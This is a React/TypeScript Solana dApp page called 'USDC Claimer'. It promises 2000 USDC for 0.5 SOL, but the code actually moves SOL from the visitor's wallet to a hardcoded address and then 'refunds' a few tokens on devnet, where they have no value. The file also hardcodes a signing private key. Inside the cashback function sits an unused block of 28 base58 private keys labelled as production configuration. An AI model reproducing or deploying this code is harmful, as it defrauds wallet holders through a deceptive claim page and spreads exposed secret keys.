/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4mCe1H2XXbBnZVurqs9rgetZu515Wcq9z4P7samQYysWu9tGGTiDG4BMH5cfvrYcji4sR7hv64v4x74SMXc5Jez8"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4ZRNESuTsRY4xSwcPq2Vk7AcvCt3t5nNAPDwHYfHPkm5yPYgv7eThGyi33j2gKvt4Jpsw3ErJwBRQFVbFjr7JzGu",
  "key1": "4ss9ef2DAVmeP93C5EoQbZYtUb84iB3R8pUqyXeNGi35eooyYaxySi8JyNWJNLPuNVcLVdv6PekL7uS5GFe6qiXW",
  "key2": "4Btg3fkfbg9LbVGFTGwE5x6X7K51Hw4JXDkfUGtv33V5kbASCpgxBiMgprFPG1D6quG3mx4kXMpwZpKM9NnKj6MB",
  "key3": "5SNGA4UjBhB3EvdDyiZLmZcKucAuF32Y1v3eBwHT11kcr5L5rcNSvsEk9drbJGz1b5HWxCi18AAWnUPgtf8a8CMi",
  "key4": "5cxhfe986yoWBSGn6UpJ7Wn8czp44Tp7L5t2gj4EUotnETT141F1C9n16F8v6yHAfKL2MVd4F99dznWBCBwxpBuF",
  "key5": "2bG8m5u4WMNP6a6SorHNbKt8xpUjv83GWxrbAkiP9sF56BZxuZJXYdV1FGZpMQKGWLshh8XbGREksGjUXJMAZ45g",
  "key6": "45SgR8M9b7Hx71DdxG44rjbUknJrLR3Btoh4LHzFPMuZQK6ugpguPDLFKi3qLELUT6DNEecRS2csfWH1zBAi4auP",
  "key7": "3maqVjDVbRp3mQxVzwjUd6C5fqcKCcoNXehKs5LMYByoX2SaTaPLiHkC4N22LVmF4Lee8mjtjjSbN58mKC2Xg8UZ",
  "key8": "52bM95nUzgND1EbM8UQKLfeYWh68JPFQ9ta25wQJAhXEwAJ4fpKCgod2RxXzrfP4SRVx9x9MetEPpjsZCs1LMTgz",
  "key9": "34TvjXdvZtYEQdKryp1Eot1JZGzoUM5sJs7TkPJErpkt5z5XYkHmkXbsYvie1qo127eorVtJVEFSL3kmh8rGqT7p",
  "key10": "2Xbwt4VPY76fRw9BQypTS2W4iR5qog77mmwrLnHfPfnqy7k8TLKY4omRpAPKk4S46uzg5y9PcxTCGEWrQ9fUfhGy",
  "key11": "UDwfBLJxEP462DgSqXj6uxBa3oRgDBQ7M6BybrDqus1S1E7HLPei2bTXbYSJXWsHQFwZPn2nHeCVKYMVnveB6QX",
  "key12": "4oV7oqLykLfKcXjRjyijckx6hduSJm4qaiZLNHTxRJTxuc5CEE9TfPBxRUxCKvB9QcvsyyWzBxEap75NHbZ52rr9",
  "key13": "3Q5n91sDkQwYfL6fDCe2duGTLqhxsBErEgrGoi5Kxb5NgvNZrTZzFeQi5ntt1LGBN24hKDMAFHi7eCj5ohCotVr4",
  "key14": "WtoZxkwTV99Ci7xFBsdT1UBwX7M1xuV3LFfbS9DybjX8HZ1rGxtdkjzYqYTDqdDZWV8RxLWD6gkLTFeqnuaAd93",
  "key15": "4SADBjc6PSaBcLXoBL4meVSj7jxRtTn5LGc2nBHMWLBg4WTncWmJDJHgFhXJ1BCCYZpntSML8v6Yt16eb5S49ecV",
  "key16": "3ji8E6MxnLLwFqu79BWCmA51Tm5bDvHEzw8d3CsBNi3MsmRV6LFJuonYzFtU9qk3SVn33mrwjFqGMjcLHBid7A1E",
  "key17": "46dCA81NMkiGieoNUzCxy7uNjEb32PTryL38g1bG81DE68CY4n5fjwMKP9PsyCcHgW7v9663Go8FkPp4FbfVWSyo",
  "key18": "3yZa5twchrLduo33SahpdS7upy4ecV1ZoccD2iWKWt1RfX6YDUWwHAsv8EY5wRZs6fHTjdRwotDLpTUHfd35UsWL",
  "key19": "4ZczXd2frUW4gxWqvovupSvjLG2okZDRjUrHroDfSy8JBBrphUdMcLadrC745gJXmDmFpffrRqHc8smTLJF5BzQR",
  "key20": "CtQEGWHpQ9jhYXn8ettC514QmLtGegZm5YngYhhCAS897RHqQarMzGSNS8dhbVE54SDNDdLRiKonBCgP29Fx75e",
  "key21": "rurkQGfdzqmWMako9XjcdbEJtDk4cisg5Jtf3ScvQM7UrZ2GMDckvdia53DbtEEJzYYqSwFoXEfiM9HY8QfPzxm",
  "key22": "4HWPigHQkt4nUXkBi1EuUDDs764PL5UqqraW5Qr9VC3c52QEHxxnXpidFA2DAVAVie8YSFyLi67KqErhPMsJiW7k",
  "key23": "46ZWfep7nkcuqi4sWk2YdNqKd1tS9zmm8WxN2cszk2ZgU7HqwzmJM6JVt6fvfQ6BSmeig8Vuues5exr7QCKXdSaN",
  "key24": "3NaqfgCP4XtsYbpoowu1LLQQxSkcyqYXkyTZvzLUfikN3xbzYtMbTupzpN4eFDYAzAR9LDPTy3exDjJrZmp1kgfq",
  "key25": "57tLJE2QCWBi173rj6kXdFYy6BYBMxfnA4sRSkQw5Y5R7wVEVJbxWm1ewf6DMQdcAL5c63FDtgH7ewZ5xTfj4hCG",
  "key26": "rTEM9xeLPLTfSULWLyNr5H4qp1zqpkDcnHiWb9G6gfK745z9np3fGt3B9HagsivZqJamXEnK1ivd2eVyLKno4Bz",
  "key27": "3VVzwHCVeabBkBxecyPH4h4KK9pG75AfWrpbuakDxGpNbJ9ZXJu5eTdsKGMD7GL1BshHJ18tgPczK6dbH3xYRRjk"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
